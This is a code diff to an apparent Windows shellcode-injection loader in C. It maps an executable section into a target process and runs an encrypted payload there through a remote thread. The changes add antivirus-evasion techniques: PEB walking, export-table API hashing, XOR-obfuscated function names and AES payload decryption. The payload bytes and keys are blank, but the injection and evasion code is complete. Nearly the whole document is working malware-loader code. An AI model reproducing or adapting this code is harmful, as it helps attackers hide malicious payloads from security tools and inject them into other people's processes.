@@ -7,9 +7,15 @@
 #include <string.h>
 #include <windows.h>
 #include <tlhelp32.h>
-
+#include <wincrypt.h>
+#pragma comment (lib, "crypt32.lib")
 #pragma comment(lib, "ntdll")
-#pragma comment(lib, "advapi32.lib") 
+#pragma comment(lib, "advapi32.lib")
+
+// #define NTDLL_HASH 0x00000000
+#define KERNEL32_HASH 0x00000000
+#define GETMODULEHANDLE_HASH 0x00000000
+#define GETPROCADDRESS_HASH 0x00000000
 
 #define InitializeObjectAttributes(p,n,a,r,s) { \
   (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
@@ -37,16 +43,7 @@ unsigned char s_wfso[] = { };
 unsigned char s_ntcs[] = { };
 unsigned char s_ntmvos[] = { };
 unsigned char s_rcut[] = { };
-unsigned char s_zw[] = { }; 
-
-// decrypted function names
-char func_ntop[14] = "";
-char func_clh[12] = "";
-char func_ntcs[16] = "";
-char func_ntmvos[19] = "";
-char func_rcut[20] = "";
-char func_zw[21] = "";
-char func_wfso[20] = "";
+unsigned char s_zw[] = { };
 
 // encrypted DLL names (kernel32.dll, ntdll.dll)
 unsigned char s_k32[] = { };
@@ -70,15 +67,15 @@ unsigned int s_zw_len = sizeof(s_zw);
 
 
 // keys
-char my_payload_key[] = "";
+unsigned char my_payload_key[] = "";
 char my_proc_key[] = "";
-unsigned char s_ntop_key[] = "";
-unsigned char s_ntcs_key[] = "";
-unsigned char s_ntmvos_key[] = "";
-unsigned char s_rcut_key[] = "";
-unsigned char s_zw_key[] = "";
-unsigned char s_clh_key[] = "";
-unsigned char s_wfso_key[] = "";
+char s_ntop_key[] = "";
+char s_ntcs_key[] = "";
+char s_ntmvos_key[] = "";
+char s_rcut_key[] = "";
+char s_zw_key[] = "";
+char s_clh_key[] = "";
+char s_wfso_key[] = "";
 char s_p32f_key[] = "";
 char s_p32n_key[] = "";
 char s_ct32s_key[] = "";
@@ -108,6 +105,23 @@ typedef struct _CLIENT_ID {
   PVOID            UniqueThread;
 } CLIENT_ID, *PCLIENT_ID;
 
+struct LDR_MODULE {
+  LIST_ENTRY e[3];
+  HMODULE base;
+  void* entry;
+  UINT size;
+  UNICODE_STRING dllPath;
+  UNICODE_STRING dllname;
+};
+
+typedef HMODULE (WINAPI *pGetModuleHandleA)(
+  LPCSTR lpModuleName
+);
+
+typedef FARPROC (WINAPI *pGetProcAddress)(
+  HMODULE hModule,
+  LPCSTR  lpProcName
+);
 
 // NtCreateSection syntax
 typedef NTSTATUS(NTAPI* pNtCreateSection)(
@@ -118,7 +132,7 @@ typedef NTSTATUS(NTAPI* pNtCreateSection)(
   IN ULONG               PageAttributess,
   IN ULONG               SectionAttributes,
   IN HANDLE              FileHandle OPTIONAL
-); 
+);
 
 // NtMapViewOfSection syntax
 typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
@@ -162,11 +176,17 @@ typedef NTSTATUS(NTAPI* pZwUnmapViewOfSection)(
   PVOID BaseAddress
 );
 
-BOOL (WINAPI * pCloseHandle)(HANDLE hObject);
-BOOL (WINAPI * pProcess32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
-BOOL (WINAPI * pProcess32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
-HANDLE (WINAPI * pCreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
-DWORD (WINAPI * pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
+// BOOL (WINAPI * pCloseHandle)(HANDLE hObject);
+// BOOL (WINAPI * pProcess32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
+// BOOL (WINAPI * pProcess32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
+// HANDLE (WINAPI * pCreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
+// DWORD (WINAPI * pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
+
+typedef BOOL (WINAPI * pCloseHandle)(HANDLE hObject);
+typedef BOOL (WINAPI * pProcess32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
+typedef BOOL (WINAPI * pProcess32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
+typedef HANDLE (WINAPI * pCreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
+typedef DWORD (WINAPI * pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
 
 // decryption
 void XOR(char * data, size_t data_len, char * key, size_t key_len) {
@@ -209,6 +229,70 @@ int AESDecrypt(char * data, unsigned int data_len, char * key, size_t keylen) {
 }
 
 
+DWORD calcMyHash(char* data) {
+  DWORD hash = 0x35;
+  for (int i = 0; i < strlen(data); i++) {
+    hash += data[i] + (hash << 1);
+  }
+  return hash;
+}
+
+static DWORD calcMyHashBase(LDR_MODULE* mdll) {
+  char name[64];
+  size_t i = 0;
+
+  while (mdll->dllname.Buffer[i] && i < sizeof(name) - 1) {
+    name[i] = (char)mdll->dllname.Buffer[i];
+    i++;
+  }
+  name[i] = 0;
+  return calcMyHash((char *)CharLowerA(name));
+}
+
+static HMODULE getKernel32(DWORD myHash) {
+  HMODULE kernel32;
+  INT_PTR peb = __readgsqword(0x60);
+  auto modList = 0x18;
+  auto modListFlink = 0x18;
+  auto kernelBaseAddr = 0x10;
+
+  auto mdllist = *(INT_PTR*)(peb + modList);
+  auto mlink = *(INT_PTR*)(mdllist + modListFlink);
+  auto krnbase = *(INT_PTR*)(mlink + kernelBaseAddr);
+  auto mdl = (LDR_MODULE*)mlink;
+  do {
+    mdl = (LDR_MODULE*)mdl->e[0].Flink;
+    if (mdl->base != nullptr) {
+      if (calcMyHashBase(mdl) == myHash) { // kernel32.dll hash
+        break;
+      }
+    }
+  } while (mlink != (INT_PTR)mdl);
+
+  kernel32 = (HMODULE)mdl->base;
+  return kernel32;
+}
+
+static LPVOID getAPIAddr(HMODULE h, DWORD myHash) {
+  PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
+  PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)h + img_dos_header->e_lfanew);
+  PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
+    (LPBYTE)h + img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+  PDWORD fAddr = (PDWORD)((LPBYTE)h + img_edt->AddressOfFunctions);
+  PDWORD fNames = (PDWORD)((LPBYTE)h + img_edt->AddressOfNames);
+  PWORD  fOrd = (PWORD)((LPBYTE)h + img_edt->AddressOfNameOrdinals);
+
+  for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
+    LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);
+
+    if (calcMyHash(pFuncName) == myHash) {
+      // printf("successfully found! %s - %d\n", pFuncName, myHash);
+      return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
+    }
+  }
+  return nullptr;
+}
+
 // get process PID
 int findMyProc(const char *procname) {
 
@@ -217,24 +301,30 @@ int findMyProc(const char *procname) {
   int pid = 0;
   BOOL hResult;
 
+  HMODULE mod = getKernel32(KERNEL32_HASH);
+  pGetModuleHandleA myGetModuleHandleA = (pGetModuleHandleA)getAPIAddr(mod, GETMODULEHANDLE_HASH);
+  pGetProcAddress myGetProcAddress = (pGetProcAddress)getAPIAddr(mod, GETPROCADDRESS_HASH);
+  HMODULE hk32 = myGetModuleHandleA(s_k32);
+  pCloseHandle myCloseHandle = (pCloseHandle)myGetProcAddress(hk32, s_clh);
+
   XOR((char *) s_p32f, s_p32f_len, s_p32f_key, sizeof(s_p32f_key));
-  pProcess32First = GetProcAddress(GetModuleHandle(s_k32), s_p32f);
+  pProcess32First myProcess32First = (pProcess32First)myGetProcAddress(hk32, s_p32f);
 
   XOR((char *) s_p32n, s_p32n_len, s_p32n_key, sizeof(s_p32n_key));
-  pProcess32Next = GetProcAddress(GetModuleHandle(s_k32), s_p32n);
+  pProcess32Next myProcess32Next = (pProcess32Next)myGetProcAddress(hk32, s_p32n);
 
   XOR((char *) s_ct32s, s_ct32s_len, s_ct32s_key, sizeof(s_ct32s_key));
-  pCreateToolhelp32Snapshot = GetProcAddress(GetModuleHandle(s_k32), s_ct32s);
+  pCreateToolhelp32Snapshot myCreateToolhelp32Snapshot = (pCreateToolhelp32Snapshot)myGetProcAddress(hk32, s_ct32s);
 
   // snapshot of all processes in the system
-  hSnapshot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+  hSnapshot = myCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
   if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
 
   // initializing size: needed for using Process32First
   pe.dwSize = sizeof(PROCESSENTRY32);
 
   // info about first process encountered in a system snapshot
-  hResult = pProcess32First(hSnapshot, &pe);
+  hResult = myProcess32First(hSnapshot, &pe);
 
   // retrieve information about the processes
   // and exit if unsuccessful
@@ -244,11 +334,11 @@ int findMyProc(const char *procname) {
       pid = pe.th32ProcessID;
       break;
     }
-    hResult = pProcess32Next(hSnapshot, &pe);
+    hResult = myProcess32Next(hSnapshot, &pe);
   }
 
   // closes an open handle (CreateToolhelp32Snapshot)
-  pCloseHandle(hSnapshot);
+  myCloseHandle(hSnapshot);
   return pid;
 }
 
@@ -262,26 +352,24 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
   PVOID rb = NULL; // remote buffer
   HANDLE th = NULL; // thread handle
   DWORD pid; // process ID
-  
+
+  HMODULE mod = getKernel32(KERNEL32_HASH);
+  pGetModuleHandleA myGetModuleHandleA = (pGetModuleHandleA)getAPIAddr(mod, GETMODULEHANDLE_HASH);
+  pGetProcAddress myGetProcAddress = (pGetProcAddress)getAPIAddr(mod, GETPROCADDRESS_HASH);
+  HMODULE hk32 = myGetModuleHandleA(s_k32);
+
   // decrypt kernel32.dll
   XOR((char *) s_k32, s_k32_len, k32_key, sizeof(k32_key));
-  
-  // decrypt CloseHandle
-  //XOR((char *) s_clh, s_clh_len, s_clh_key, sizeof(s_clh_key));
-  AESDecrypt((char *)s_clh, s_clh_len, s_clh_key, sizeof(s_clh_key));
-  snprintf(func_clh, sizeof(func_clh), "%s", s_clh);
-  pCloseHandle = GetProcAddress(GetModuleHandle(s_k32), func_clh);
-  // printf("CloseHandle: %s\n", (char *)func_clh);
 
-  //pCloseHandle = GetProcAddress(GetModuleHandle(s_k32), s_clh);
+  // decrypt CloseHandle
+  XOR((char *) s_clh, s_clh_len, s_clh_key, sizeof(s_clh_key));
+  pCloseHandle myCloseHandle = (pCloseHandle)myGetProcAddress(hk32, s_clh);
 
   // decrypt process name
   XOR((char *) my_proc, my_proc_len, my_proc_key, sizeof(my_proc_key));
-  
-  // printf("process; %s\n", (char *) my_proc);
+
   pid = findMyProc(my_proc);
-  // printf("PID: %d\n", pid);
-  
+
   OBJECT_ATTRIBUTES oa;
   CLIENT_ID cid;
   InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
@@ -292,64 +380,28 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
   XOR((char *) s_ntd, s_ntd_len, ntd_key, sizeof(ntd_key));
 
   // decrypt NtOpenProcess
-  // XOR((char *) s_ntop, s_ntop_len, s_ntop_key, sizeof(s_ntop_key));
-
-  AESDecrypt((char *)s_ntop, s_ntop_len, s_ntop_key, sizeof(s_ntop_key));
-  snprintf(func_ntop, sizeof(func_ntop), "%s", s_ntop);
+  XOR((char *) s_ntop, s_ntop_len, s_ntop_key, sizeof(s_ntop_key));
 
   // decrypt NtCreateSection
-  // XOR((char *) s_ntcs, s_ntcs_len, s_ntcs_key, sizeof(s_ntcs_key));
-  AESDecrypt((char *)s_ntcs, s_ntcs_len, s_ntcs_key, sizeof(s_ntcs_key));
-  snprintf(func_ntcs, sizeof(func_ntcs), "%s", s_ntcs);
+  XOR((char *) s_ntcs, s_ntcs_len, s_ntcs_key, sizeof(s_ntcs_key));
 
   // decrypt NtMapViewOfSection
-  // XOR((char *) s_ntmvos, s_ntmvos_len, s_ntmvos_key, sizeof(s_ntmvos_key));
-  AESDecrypt((char *)s_ntmvos, s_ntmvos_len, s_ntmvos_key, sizeof(s_ntmvos_key));
-  snprintf(func_ntmvos, sizeof(func_ntmvos), "%s", s_ntmvos);
-  
+  XOR((char *) s_ntmvos, s_ntmvos_len, s_ntmvos_key, sizeof(s_ntmvos_key));
+
   // RtlCreateUserThread
-  // XOR((char *) s_rcut, s_rcut_len, s_rcut_key, sizeof(s_rcut_key));
-  AESDecrypt((char *)s_rcut, s_rcut_len, s_rcut_key, sizeof(s_rcut_key));
-  snprintf(func_rcut, sizeof(func_rcut), "%s", s_rcut);
+  XOR((char *) s_rcut, s_rcut_len, s_rcut_key, sizeof(s_rcut_key));
 
   // decrypt ZwUnmapViewOfSection
-  // XOR((char *) s_zw, s_zw_len, s_zw_key, sizeof(s_zw_key));
-  AESDecrypt((char *)s_zw, s_zw_len, s_zw_key, sizeof(s_zw_key));
-  snprintf(func_zw, sizeof(func_zw), "%s", s_zw);
+  XOR((char *) s_zw, s_zw_len, s_zw_key, sizeof(s_zw_key));
 
   // loading ntdll.dll
-  HANDLE ntdll = GetModuleHandle(s_ntd);
+  HANDLE ntdll = myGetModuleHandleA(s_ntd);
 
-  /*
-  printf("NTOP: %s\n", (char *)s_ntop);
-  printf("NTCS: %s\n", (char *)s_ntcs);
-  printf("NTMVOS: %s\n", (char *)s_ntmvos);
-  printf("RCUT: %s\n", (char *)s_rcut);
-  printf("ZW: %s\n", (char *)s_zw);
-  */
-  
-  /*
-  printf("NTOP: %s\n", (char *)func_ntop);
-  printf("NTCS: %s\n", (char *)func_ntcs);
-  printf("NTMVOS: %s\n", (char *)func_ntmvos);
-  printf("RCUT: %s\n", (char *)func_rcut);
-  printf("ZW: %s\n", (char *)func_zw);
-  printf("CloseHandle: %s\n", (char *)func_clh);
-  */
-
-  /*
-  pNtOpenProcess myNtOpenProcess = (pNtOpenProcess)GetProcAddress(ntdll, s_ntop);
-  pNtCreateSection myNtCreateSection = (pNtCreateSection)(GetProcAddress(ntdll, s_ntcs));
-  pNtMapViewOfSection myNtMapViewOfSection = (pNtMapViewOfSection)(GetProcAddress(ntdll, s_ntmvos));
-  pRtlCreateUserThread myRtlCreateUserThread = (pRtlCreateUserThread)(GetProcAddress(ntdll, s_rcut));
-  pZwUnmapViewOfSection myZwUnmapViewOfSection = (pZwUnmapViewOfSection)(GetProcAddress(ntdll, s_zw));
-  */ 
-
-  pNtOpenProcess myNtOpenProcess = (pNtOpenProcess)GetProcAddress(ntdll, func_ntop);
-  pNtCreateSection myNtCreateSection = (pNtCreateSection)(GetProcAddress(ntdll, func_ntcs));
-  pNtMapViewOfSection myNtMapViewOfSection = (pNtMapViewOfSection)(GetProcAddress(ntdll, func_ntmvos));
-  pRtlCreateUserThread myRtlCreateUserThread = (pRtlCreateUserThread)(GetProcAddress(ntdll, func_rcut));
-  pZwUnmapViewOfSection myZwUnmapViewOfSection = (pZwUnmapViewOfSection)(GetProcAddress(ntdll, func_zw));
+  pNtOpenProcess myNtOpenProcess = (pNtOpenProcess)myGetProcAddress(ntdll, s_ntop);
+  pNtCreateSection myNtCreateSection = (pNtCreateSection)myGetProcAddress(ntdll, s_ntcs);
+  pNtMapViewOfSection myNtMapViewOfSection = (pNtMapViewOfSection)myGetProcAddress(ntdll, s_ntmvos);
+  pRtlCreateUserThread myRtlCreateUserThread = (pRtlCreateUserThread)myGetProcAddress(ntdll, s_rcut);
+  pZwUnmapViewOfSection myZwUnmapViewOfSection = (pZwUnmapViewOfSection)myGetProcAddress(ntdll, s_zw);
 
   // create a memory section
   myNtCreateSection(&sh, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionS, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
@@ -360,46 +412,37 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
   // open remote proces via NT API
   HANDLE ph = NULL;
   myNtOpenProcess(&ph, PROCESS_ALL_ACCESS, &oa, &cid);
-  
+
   if (!ph) {
     printf("failed to open process :(\n");
     return -2;
   }
-  
+
   // bind the object in the memory of the target process for reading and executing
   myNtMapViewOfSection(sh, ph, &rb, NULL, NULL, NULL, &s, 2, NULL, PAGE_EXECUTE_READ);
 
   // decrypt payload
-  XOR((char *) my_payload, my_payload_len, my_payload_key, sizeof(my_payload_key));
+  AESDecrypt((char *) my_payload, my_payload_len, my_payload_key, sizeof(my_payload_key));
 
   // write payload
   memcpy(lb, my_payload, sizeof(my_payload));
-
-  //printf("current = %p\n", lb);
-  //printf("target = %p\n", rb);
 
   // create a thread
   myRtlCreateUserThread(ph, NULL, FALSE, 0, 0, 0, rb, NULL, &th, NULL);
 
   // decrypt WaitForSingleObject function call
-  // XOR((char *) s_wfso, s_wfso_len, s_wfso_key, sizeof(s_wfso_key));
-  // pWaitForSingleObject = GetProcAddress(GetModuleHandle(s_k32), s_wfso);
-  
-  AESDecrypt((char *)s_wfso, s_wfso_len, s_wfso_key, sizeof(s_wfso_key));
-  snprintf(func_wfso, sizeof(func_wfso), "%s", s_wfso);
-  pWaitForSingleObject = GetProcAddress(GetModuleHandle(s_k32), func_wfso);
-  // printf("WFSO: %s\n", (char *)func_wfso);
-
+  XOR((char *) s_wfso, s_wfso_len, s_wfso_key, sizeof(s_wfso_key));
+  pWaitForSingleObject myWaitForSingleObject = (pWaitForSingleObject)myGetProcAddress(hk32, s_wfso);
 
   // and wait
-  if (pWaitForSingleObject(th, INFINITE) == WAIT_FAILED) {
+  if (myWaitForSingleObject(th, INFINITE) == WAIT_FAILED) {
     return -2;
   }
-  
+
   // clean up
   myZwUnmapViewOfSection(GetCurrentProcess(), lb);
   myZwUnmapViewOfSection(ph, rb);
-  pCloseHandle(sh);
-  pCloseHandle(ph);
+  myCloseHandle(sh);
+  myCloseHandle(ph);
   return 0;
 }
